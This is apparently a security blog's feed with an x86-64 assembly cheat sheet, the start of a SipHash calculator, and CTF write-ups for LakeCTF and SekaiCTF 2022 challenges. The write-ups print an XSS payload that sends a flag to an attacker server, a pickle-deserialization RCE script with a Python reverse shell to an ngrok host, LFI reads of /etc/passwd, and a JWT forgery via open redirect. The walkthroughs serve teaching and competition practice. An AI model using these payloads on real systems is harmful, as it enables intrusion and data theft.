<ol class="bibliography"><li><span id="zhu19deep">Zhu, L., Liu, Z., &amp; Han, S. (2019). Deep Leakage from Gradients. <i>Advances in Neural Information Processing Systems</i>.</span></li></ol>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><category term="ctf neural network" /><summary type="html"><![CDATA[This is my writeup for the only Misc challenge “Deaths Glance” in HTB University CTF 2022 (on CTFtime).]]></summary></entry><entry><title type="html">x86-64 Assembly Cheat Sheet</title><link href="https://www.cjxol.com/posts/x86-64-assembly-cheat-sheet/" rel="alternate" type="text/html" title="x86-64 Assembly Cheat Sheet" /><published>2022-10-19T00:00:00+01:00</published><updated>2022-10-19T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/x86-64-assembly-cheat-sheet</id><content type="html" xml:base="https://www.cjxol.com/posts/x86-64-assembly-cheat-sheet/"><![CDATA[<p>This is still being updated upon I find useful things.</p>

<h2 id="registers">Registers</h2>

<h3 id="general-purpose-registers">General-Purpose Registers</h3>

<table>
  <thead>
    <tr>
      <th>qword</th>
      <th>dword</th>
      <th>word</th>
      <th>high byte</th>
      <th>low byte</th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>rax</td>
      <td>eax</td>
      <td>ax</td>
      <td>ah</td>
      <td>al</td>
      <td> </td>
    </tr>
    <tr>
      <td>rbx</td>
      <td>ebx</td>
      <td>bx</td>
      <td>bh</td>
      <td>bl</td>
      <td> </td>
    </tr>
    <tr>
      <td>rcx</td>
      <td>ecx</td>
      <td>cx</td>
      <td>ch</td>
      <td>cl</td>
      <td> </td>
    </tr>
    <tr>
      <td>rdx</td>
      <td>edx</td>
      <td>dx</td>
      <td>dh</td>
      <td>dl</td>
      <td> </td>
    </tr>
    <tr>
      <td>rbp</td>
      <td>ebp</td>
      <td>bp</td>
      <td>bph</td>
      <td>bpl</td>
      <td>base pointer</td>
    </tr>
    <tr>
      <td>rsp</td>
      <td>esp</td>
      <td>sp</td>
      <td>sph</td>
      <td>spl</td>
      <td>stack pointer</td>
    </tr>
    <tr>
      <td>rsi</td>
      <td>esi</td>
      <td>si</td>
      <td>sih</td>
      <td>sil</td>
      <td> </td>
    </tr>
    <tr>
      <td>rdi</td>
      <td>edi</td>
      <td>di</td>
      <td>dih</td>
      <td>dil</td>
      <td> </td>
    </tr>
    <tr>
      <td>r8</td>
      <td>r8d</td>
      <td>r8w</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>…</td>
      <td>…</td>
      <td>…</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>r15</td>
      <td>r15d</td>
      <td>r15w</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h3 id="calling-convention">Calling Convention</h3>

<p>In <a href="https://riptutorial.com/x86/example/11197/64-bit-system-v">64-bit System V</a>:</p>

<table>
  <thead>
    <tr>
      <th>Argument</th>
      <th>1</th>
      <th>2</th>
      <th>3</th>
      <th>4</th>
      <th>5</th>
      <th>6</th>
      <th>7</th>
      <th>8</th>
      <th>9</th>
      <th>10</th>
      <th>…</th>
      <th>return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Location</td>
      <td>rdi</td>
      <td>rsi</td>
      <td>rdx</td>
      <td>rcx</td>
      <td>r8</td>
      <td>r9</td>
      <td>r10</td>
      <td>r11</td>
      <td>[rsp]</td>
      <td>[rsp+8]</td>
      <td>…</td>
      <td>rax</td>
    </tr>
  </tbody>
</table>

<p>Preserved registers: values of <code class="highlighter-rouge">r12-r15</code>, <code class="highlighter-rouge">rbx</code>, <code class="highlighter-rouge">rsp</code>, <code class="highlighter-rouge">rbp</code> are preserved across function calls.</p>

<h3 id="system-call-convention">System Call Convention</h3>

<p>Linux syscall follows a slightly different convention to function calls (see <code class="highlighter-rouge">man syscall</code>):</p>

<p>In x86-64, the syscall number is passed using <code class="highlighter-rouge">rax</code>, and return value is stored in <code class="highlighter-rouge">rax</code>, and the registers used to pass the arguments are listed in the table below:</p>

<table>
  <thead>
    <tr>
      <th>Argument</th>
      <th>1</th>
      <th>2</th>
      <th>3</th>
      <th>4</th>
      <th>5</th>
      <th>6</th>
      <th>return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Location</td>
      <td>rdi</td>
      <td>rsi</td>
      <td>rdx</td>
      <td>r10</td>
      <td>r8</td>
      <td>r9</td>
      <td>rax</td>
    </tr>
  </tbody>
</table>

<p><a href="https://filippo.io/linux-syscall-table/">List of linux syscalls</a>.</p>

<h2 id="conditional-jump-instructions">Conditional Jump Instructions</h2>

<p><a href="http://unixwiz.net/techtips/x86-jumps.html">List of conditional jumps</a>.</p>

<h2 id="more-resources">More Resources</h2>

<ul>
  <li><a href="https://ike.mahaloz.re/">`Ike: The Systems Hacking Handbook</a></li>
</ul>]]></content><author><name></name></author><category term="cheat sheet" /><category term="assembly" /><summary type="html"><![CDATA[This is still being updated upon I find useful things.]]></summary></entry><entry><title type="html">LakeCTF Qualifications People (Web) Writeup</title><link href="https://www.cjxol.com/posts/lakectf-web-people-writeup/" rel="alternate" type="text/html" title="LakeCTF Qualifications People (Web) Writeup" /><published>2022-10-12T00:00:00+01:00</published><updated>2022-10-12T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/lakectf-web-people-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/lakectf-web-people-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>

<p>This is my writeup to web challenge “<a href="https://ctf.polygl0ts.ch/challenges#People-18">People</a>” in <a href="https://ctf.polygl0ts.ch/">LakeCTF</a> Qualifications round. LakeCTF is orgnised by EPFL’s CTF team <a href="https://polygl0ts.ch/">polygl0ts</a>. This challenge is solved by 36 teams out of 191 teams scored at least 1 point on the scoreboard. In this challenge I exploited XSS and improper configuration of CSP, more specifically omitting <code class="highlighter-rouge">base-uri</code>.</p>

<p>The challenge has a downloadable. Examining the code and the application, users can signup a profile with bio and other information, as well as logging in. Upon logging in, user is redirected to their profile page where user information is shown. Users can also report their profile, resulting in the profile page being visited by an admin bot.</p>

<p>This type of web challenges with a bot visiting the page normally involves in exploiting cross-site scripting (XSS).</p>

<p>It appears that it is likely the XSS is on the profile page that the bot visits, and the page displays user information stored in the database. We set the information of the user when signing up the user, however, the signup endpoint is rate limited, so we cannot test many payload through that endpoint on the live website. There is another <code class="highlighter-rouge">/edit</code> endpoint which also enables us to update user information, and there is no rate limit on that endpoint, so we could conveniently test different input on the live website without setting up our own docker container.</p>

<p>Our team managed to quickly find the potential injection point on the profile page. Despite the input are escaped when rendering the page, we noticed that the title also shows data from the database, and the code does not escape it:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% set description = '%s at %s' % (user['title'], user['lab']) %}
{% block title %}{{user['fullname']}} | {{description|safe}}{% endblock %}
</code></pre></div></div>

<p>As shown above, the <code class="highlighter-rouge">safe</code> filter in the template disables escaping. Thus, we managed to put HTML and JavaScript code into the webpage.</p>

<h2 id="bypass-csp">Bypass CSP</h2>

<p>Despite we have managed to inject new tags and code, we could still not make the browser to execute our XSS code. This is because the app sets <code class="highlighter-rouge">Content-Security-Policy</code> HTTP header that only script tags with the defined nonce would run.</p>

<p>However, the CSP did not define <code class="highlighter-rouge">base-uri</code>, and two of the <code class="highlighter-rouge">&lt;script&gt;</code> tags on the profile page did not use full URL:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/static/js/marked.min.js"</span> <span class="na">nonce=</span><span class="s">"qvAsaTf6Pe8F101A71nf7vOt1lktIAiK"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/static/js/purify.min.js"</span> <span class="na">nonce=</span><span class="s">"qvAsaTf6Pe8F101A71nf7vOt1lktIAiK"</span><span class="nt">&gt;&lt;/script&gt;</span>
</code></pre></div></div>

<p>Conveniently, the XSS injection point is in <code class="highlighter-rouge">&lt;title&gt;</code>, which is in <code class="highlighter-rouge">&lt;head&gt;</code>, thus we are able to define new base:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;base</span> <span class="na">href=</span><span class="s">"https://my-server.example.com"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>This will result in one of the script on the profile page to load from <code class="highlighter-rouge">https://my-server.example.com/static/js/marked.min.js</code> and execute.</p>

<p>The final info we set to user’s title in their profile is <code class="highlighter-rouge">&lt;/title&gt;&lt;base href="https://my-server.example.com"&gt;&lt;/head&gt;</code>, and we serve the JavaScript payload at <code class="highlighter-rouge">https://my-server.example.com/static/js/marked.min.js</code>.</p>

<h2 id="getting-the-flag">Getting the Flag</h2>

<p>Now we are able to make the profile page to pop an alert of whatever we put in the JavaScript file. However our goal is to steal the flag. The flag is accessible through the <code class="highlighter-rouge">/flag</code> endpoint in the webapp. The endpoint checks for <code class="highlighter-rouge">admin_token</code> in cookies. We might want to steal the cookies first, however, when the admin bot visits the webpage, their cookie is set to <code class="highlighter-rouge">httpOnly</code>, so we cannot use XSS to get the cookie. As getting the flag is our only goal, we can workaround by using <code class="highlighter-rouge">fetch</code> API or XMLHttpRequest. As when doing such request on the same site, cookies are sent, and flag will be retrieved.</p>

<p>Our final JavaScript for getting the flag and exfil is:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://web:8080/flag</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://my-server.example.com/xss?</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">data</span><span class="p">));</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry><entry><title type="html">SekaiCTF 2022 Writeup</title><link href="https://www.cjxol.com/posts/sekaictf-2022-writeup/" rel="alternate" type="text/html" title="SekaiCTF 2022 Writeup" /><published>2022-10-11T00:00:00+01:00</published><updated>2022-10-11T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/sekaictf-2022-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/sekaictf-2022-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>

<p>This is my writeup to web challenges “<a href="https://ctf.sekai.team/challenges#Bottle-Poem-29">Bottle Poem</a>”, “<a href="https://ctf.sekai.team/challenges#Issues-33">Issues</a>” and reverse challenge “<a href="https://ctf.sekai.team/challenges#Perfect-Match-X-treme-44">Perfect Match X-treme</a>” in <a href="https://ctf.sekai.team/">SekaiCTF 2022</a>. The official source code and solution provided by the challenge authors are here: <a href="https://github.com/project-sekai-ctf/sekaictf-2022">https://github.com/project-sekai-ctf/sekaictf-2022</a>. I started doing the CTF when I joined a team halfway through the CTF. The exploits and skills involved in these 3 challenges in this writeup includes local file inclusion (LFI), unsafe deserialization and remote code execution (RCE), improper use of JWKS, open redirect, Unity game reversing and general/reversing tooling.</p>

<p>On this page:</p>

<ul>
  <li><a href="#bottle-poem-web">Bottle Poem (Web) writeup</a></li>
  <li><a href="#issues-web">Issues (Web) writeup</a></li>
  <li><a href="#perfect-match-x-treme">Perfect Match X-treme (Reverse) writeup</a></li>
</ul>

<h2 id="bottle-poem-web">Bottle Poem (Web)</h2>

<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-index.png" alt="Bottle Poem index page." /></p>

<p>In the first webpage of the challenge, there are three links to “poems in the Bottle”.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-spring.png" alt="First poem in the Bottle." /></p>

<p>Upon clicking the link, we noticed the value of the query parameter <code class="highlighter-rouge">id</code> appears to be the filename of the file to be shown. For example, the link “Spring” links to <code class="highlighter-rouge">http://bottle-poem.ctf.sekai.team/show?id=spring.txt</code>.</p>

<h3 id="local-file-inclusion-and-leaking-source-code">Local File Inclusion and Leaking Source Code</h3>

<p>Filename being passed into as query parameter smells like the recipe for local file inclusion (LFI). Though the challenge description states the flag is an executable, and we cannot just make the webpage to include and display the flag, we however can get more information exploiting LFI.</p>

<p>To confirm LFI, we tried to pass <code class="highlighter-rouge">/etc/passwd</code> as value of <code class="highlighter-rouge">id</code> parameter, and we get content of <code class="highlighter-rouge">/etc/passwd</code> being returned.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-passwd.png" alt="/etc/passwd leaked." /></p>

<p>From the HTTP header <code class="highlighter-rouge">server: WSGIServer/0.2 CPython/3.8.12</code>, I can tell the backend is in Python. Many Python webapps in CTFs would have a <code class="highlighter-rouge">app.py</code> file as the entry point of the apps, so I tried to see if the file exists in the directory of the poem files or the parent directory, which hopefully to be the webapp’s root.</p>

<p>When I tried <code class="highlighter-rouge">../app.py</code>, instead of showing “No This Poems”, it showed “No!!!!”, which means <code class="highlighter-rouge">../app.py</code> file likely exists and the author prevents us from seeing it.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-app-py-no.png" alt="../app.py but we cannot see it." /></p>

<p>Trying with several different “files” known to normally exist on Linux, <code class="highlighter-rouge">/proc/self/cmdline</code> gave me the command runs the webapp <code class="highlighter-rouge">python3 -u /app/app.py</code>. This gave me the absolute location of <code class="highlighter-rouge">app.py</code> file.</p>

<p><code class="highlighter-rouge">/app/app.py</code> worked around the restrictions when using relevant path and leaked the source code of the webapp.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-app-py.png" alt="app.py" /></p>

<p>From the source code, I can see the app used Bottle web framework.</p>

<h3 id="admin-and-other-distractions">Admin? And Other Distractions</h3>

<p>In the function for <code class="highlighter-rouge">/sign</code>, I can see the if we do not have a session prior we will be assigned a guest session, if we have an admin session, we will have a different template rendered.</p>

<p>Without looking into the templates, I started just obtaining admin session. I leaked the secret for signing the cookies from <code class="highlighter-rouge">/app/config/secret.py</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sekai</span> <span class="o">=</span> <span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span>
</code></pre></div></div>

<p>I then installed Bottle and used it to serve webpage that sets signed cookie with data <code class="highlighter-rouge">{"name": "admin"}</code> to obtain the admin cookie:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span>

<span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/hello'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">hello</span><span class="p">():</span>
    <span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s">"name"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">}</span>
    <span class="n">response</span><span class="p">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s">"name"</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"Hello World!"</span>

<span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'localhost'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<p>The value of the admin cookie produced is <code class="highlighter-rouge">!rsOwvUb6jllVHQVOPlZv5w==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg==</code>. I then set the cookie named <code class="highlighter-rouge">name</code> as this value, and visited <code class="highlighter-rouge">/sign</code>, however, the page shown to me was not impressive. It showed me “Hello, you are admin, but it’s useless.”</p>

<p>I looked around both templates for guest and admin, which are located in <code class="highlighter-rouge">/app/views/</code>, and named <code class="highlighter-rouge">guest.html</code> and <code class="highlighter-rouge">admin.html</code> respectively. The template files are just HTML with template syntax tags. The two lines from those files appear the most interesting as they contains template variable tags:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello {{{name}}, what r u doing????
Hello, you are {{name}}, but it’s useless.
</code></pre></div></div>

<p>I wondered if any server-side template injection (SSTI) possible here. However, it appeared the <code class="highlighter-rouge">name</code> variable passed into the template is from the session cookie’s <code class="highlighter-rouge">name</code>, and the templates only renders if the value to be “guest” or “admin”, and any other values would not work.</p>

<h3 id="finding-the-exploit">Finding the Exploit</h3>

<p>Bottle is a rather small framework, when I was looking into <a href="https://github.com/bottlepy/bottle/blob/99341ff3791b2e7e705d7373e71937e9018eb081/bottle.py">the source code of Bottle</a> to figure out how to forge the admin cookie, I noticed a deprecate warning at <a href="https://github.com/bottlepy/bottle/blob/99341ff3791b2e7e705d7373e71937e9018eb081/bottle.py#L1850">line 1850</a> about pickling of arbitrary objects into cookies. I did some search and find this rather old <a href="https://github.com/bottlepy/bottle/issues/900">issue</a> from 2016 regarding the security of using pickle to deserialize cookie values, which causes remote code execution (RCE).</p>

<p>Our team crafted a similar payload as the cookie value based on this exploit and got the flag:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">hmac</span>
<span class="kn">import</span> <span class="nn">hashlib</span>

<span class="k">class</span> <span class="nc">RCE</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="s">"""
            python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.eu.ngrok.io",16526));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
        """</span>
        <span class="k">return</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,)</span>

<span class="k">def</span> <span class="nf">gen_cookie</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">b64pld</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">signature</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span>
        <span class="n">hmac</span><span class="p">.</span><span class="n">new</span><span class="p">(</span>
            <span class="sa">b</span><span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span><span class="p">,</span> <span class="n">b64pld</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span>
        <span class="p">).</span><span class="n">digest</span><span class="p">()</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="sa">b</span><span class="s">'"!'</span> <span class="o">+</span> <span class="n">signature</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"?"</span> <span class="o">+</span> <span class="n">b64pld</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'"'</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">pickled</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RCE</span><span class="p">())</span>
    <span class="k">print</span><span class="p">(</span><span class="n">gen_cookie</span><span class="p">(</span><span class="n">pickled</span><span class="p">))</span>
</code></pre></div></div>

<h3 id="bottle-poem-conclusion">Bottle Poem Conclusion</h3>

<p>In this challenge we exploited LFI to leak information including the source of the webapp, and use of insecure deprecated features of unsafe deserialization in the framework which leads to RCE.</p>

<h2 id="issues-web">Issues (Web)</h2>

<p>This challenge has a downloadable, which contains the source of the challenge. Examining the source, it has an <code class="highlighter-rouge">app.py</code> and an <code class="highlighter-rouge">api.py</code> file contains the most interesting part of the challenge. In <code class="highlighter-rouge">app.py</code>, it has a <code class="highlighter-rouge">/.well-known/jwks.json</code> endpoint which returns a pre-defined JSON Web Key Set (JWKS). The flag is in a text file, and <code class="highlighter-rouge">/api/flag</code> endpoint would return the content of the file. However, the flag api endpoint requires authorization to access.</p>

<p>Looking into the authorization code, it checks bearer tokens in header. The token is a JSON Web Token (JWT), and the public key used to verify the token is from the issuer defined in JWT token, grabbed with <code class="highlighter-rouge">requests.get(url)</code>. Thus, we could use our own public and private key pair to sign the JWT, and point the issuer to somewhere we have control thus provides our own public key for the app to verify the token.</p>

<p>Is it that easy though? Before getting the public key, it checks if the issuer is from <code class="highlighter-rouge">localhost:8080</code> with <code class="highlighter-rouge">urlparse(issuer).netloc</code>. With this check, we can no longer point the issuer to anything we want other than <code class="highlighter-rouge">localhost:8080</code>. I tried to exploit <code class="highlighter-rouge">urlparse</code> to bypass the restriction, however, it did not seem would work (though not relevant, during the research, I learned that <code class="highlighter-rouge">urlparse</code> has interesting behaviour when returning hostnames e.g. <a href="https://bugs.python.org/issue36338">this report on Python bug tracker</a>, and <a href="https://security.snyk.io/vuln/SNYK-JS-URLPARSE-2407759">Python has this issue as described in this CVE for the Node.js package too</a>).</p>

<p>When I reviewed the challenge code again, I noticed the <code class="highlighter-rouge">/logout</code> endpoint has an redirect after clearing the session, which defaults to <code class="highlighter-rouge">home</code>, however it does not do any check on the <code class="highlighter-rouge">redirect</code> parameter if given, and would redirect to whatever is passed onto. This is vulnerable to open redirect. I used this open redirect endpoint to bypass the restriction on issuer, crafted issuer <code class="highlighter-rouge">http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&amp;a=</code>, which results in the app requests JWKS from my own server.</p>

<h3 id="crafting-the-final-payload">Crafting the Final Payload</h3>

<p>Generate RSA private and public key:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa <span class="nt">-out</span> rsa.private 512
openssl rsa <span class="nt">-in</span> rsa.private <span class="nt">-out</span> rsa.public <span class="nt">-pubout</span> <span class="nt">-outform</span> PEM
</code></pre></div></div>

<p>Make <code class="highlighter-rouge">jwks.json</code> to be served with HTTP server:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"keys"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"x5c"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                </span><span class="s2">"&lt;content of public key&gt;"</span><span class="w">
            </span><span class="p">]</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Generate the admin token:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">jwt</span>

<span class="n">private_key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'rsa.private'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

<span class="k">print</span><span class="p">(</span><span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">'user'</span><span class="p">:</span> <span class="s">'admin'</span><span class="p">},</span> <span class="n">private_key</span><span class="p">,</span> <span class="s">'RS256'</span><span class="p">,</span> <span class="p">{</span><span class="s">'issuer'</span><span class="p">:</span> <span class="s">'http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&amp;a='</span><span class="p">})</span>
</code></pre></div></div>

<p>The token looks like this:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9teS1zZXJ2ZXIuZXhhbXBsZS5jb20vLndlbGxfa25vd24vandrcy5qc29uJmE9In0.eyJ1c2VyIjoiYWRtaW4ifQ.quNOTqf6U7kBTFlK32Nm9QhLL9IkRvtsdnfFm8Ct_Cgr8CCjrIc-H-o3oaKJ_UnEVzsizx4BTlFZJQEuXTkB6w
</code></pre></div></div>

<p>Request <code class="highlighter-rouge">/api/flag</code> endpoint with the authorization header using the token:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9teS1zZXJ2ZXIuZXhhbXBsZS5jb20vLndlbGxfa25vd24vandrcy5qc29uJmE9In0.eyJ1c2VyIjoiYWRtaW4ifQ.quNOTqf6U7kBTFlK32Nm9QhLL9IkRvtsdnfFm8Ct_Cgr8CCjrIc-H-o3oaKJ_UnEVzsizx4BTlFZJQEuXTkB6w
</code></pre></div></div>

<p>Get flag <code class="highlighter-rouge">SEKAI{v4l1d4t3_y0ur_i55u3r_plz}</code>.</p>

<h3 id="issues-conclusion">Issues Conclusion</h3>

<p>I exploited the use of JWKS and open redirect in the challenge.</p>

<h2 id="perfect-match-x-treme">Perfect Match X-treme</h2>

<p>This challenge has a downloadable, which contains a Unity game. The game looks similar to Perfect Match minigame in Fall Guys: Ultimate Knockout (<a href="https://youtu.be/edifg0uMzxU">https://youtu.be/edifg0uMzxU</a>). The gameplay is to remember the fruits the tiles corresponding to in each round, and stand on the tiles matching the fruit shown on the screen at the end of the round to progress into the next round.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-game.png" alt="Challenge screenshot." /></p>

<p>However, in the third round of the challenge game, it always shows the SekaiCTF logo on the screen, and no tiles matches. Thus, we cannot finish the game through normal gameplay to finish the game.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-eliminated.png" alt="Eliminated screen." /></p>

<p>Examining the files, and reading <a href="https://github.com/imadr/Unity-game-hacking">some guide</a>, I identified <code class="highlighter-rouge">/PerfectMatch_Data/Managed/Assembly-CSharp.dll</code> would be the interesting file that contains the game’s logic (<code class="highlighter-rouge">Assembly-UnityScript.dll</code> would be interesting too if it exists according to the guide).</p>

<p>The next step is to use decompiler for .NET or Unity. I tried to decompile the DLL file with dotPeak, ILSpy and dnSpyEx, and they all worked. I used primarily <a href="https://github.com/dnSpyEx/dnSpy">dnSpyEx</a> during this challenge.</p>

<p>Opening the DLL in dnSpyEx, <code class="highlighter-rouge">GameManager</code> contains the logic of choosing fruits for each round. Browsing around content in the DLL, I find the code for showing the flag is in UI. The screenshot of the content of the decompiled DLL and content of UI is shown below:</p>

<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-decompile-ui.png" alt="Decompiled Assembly-UnityScript.dll content." /></p>

<p>The flag appeared to be 3 pieces of text putting together, I guessed it could be 3 pieces of strings stored in some data file, which might be <code class="highlighter-rouge">/PerfectMatch_Data/level0</code>. To check further, I used <code class="highlighter-rouge">grep -r "SEKAI{" .</code>, and it returned <code class="highlighter-rouge">grep: ./PerfectMatch_Data/level0: binary file matches</code>. Then I used <code class="highlighter-rouge">strings</code> to extract the strings of the flag, and find this part of the output looks like the strings for the flag:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEKAI{F4LL_GUY5_
fff?fff?
Qualified!
1LL3G4L}
H3CK_15_
</code></pre></div></div>

<p>Putting the 3 parts together, got the flag <code class="highlighter-rouge">SEKAI{F4LL_GUY5_H3CK_15_1LL3G4L}</code>.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry><entry><title type="html">SipHash Calculator</title><link href="https://www.cjxol.com/posts/siphash-calculator/" rel="alternate" type="text/html" title="SipHash Calculator" /><published>2022-07-08T00:00:00+01:00</published><updated>2022-07-08T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/siphash-calculator</id><content type="html" xml:base="https://www.cjxol.com/posts/siphash-calculator/"><![CDATA[<link rel="stylesheet" href="/assets/css/bootstrap-custom.css" />

<form class="bootstrap">
    <div class="form-group row">
        <label for="message" class="col-2 col-form-label">Message</label>
        <textarea class="form-control col" id="message" row="1"></textarea>
        <select id="messageType" class="form-control col-3" title="Message type">
            <option selected="">Text</option>
            <option>Hex</option>
            <option>Base64</option>
        </select>
    </div>
    <div class="form-group row">
        <label for="key" class="col-2 col-form-label">Key</label>
        <input class="form-control col" type="text" id="key" />
        <select id="keyType" class="form-control col-3" title="Key type">
            <option selected="">Text</option>
            <option>Hex</option>
            <option>Decimal</option>
            <option>Base64</option>
        </select>
    </div>
    <div class="form-group row">
        <span class="col-2">SipRound</span>
